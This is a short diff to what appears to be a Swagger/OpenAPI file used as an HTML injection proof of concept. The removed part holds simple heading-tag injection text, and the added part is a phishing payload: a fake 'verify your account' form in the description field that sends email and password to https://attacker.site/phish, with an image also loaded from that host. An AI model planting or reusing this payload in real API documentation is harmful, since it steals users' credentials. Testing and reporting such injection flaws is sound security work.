@@ -1,14 +1,8 @@
-swagger: '2.0'
-info:
-  version: 1.0.0
-  title: HTML Injection Test - Varad_PM
-  description: >
-    <h1>HTML Injection PoC</h1>
-    <h2>Injected by Varad_PM</h2>
-    <h3>This is a basic HTML payload using heading tags</h3>
-paths:
-  /:
-    get:
-      responses:
-        '200':
-          description: OK
+description: |
+  <img src="https://attacker.site/logo.png" alt="Image">
+  <h3>Please verify your account below</h3>
+  <form action="https://attacker.site/phish" method="POST">
+    <input name="email" placeholder="Email">
+    <input name="password" placeholder="Password" type="password">
+    <button type="submit">Submit</button>
+  </form>
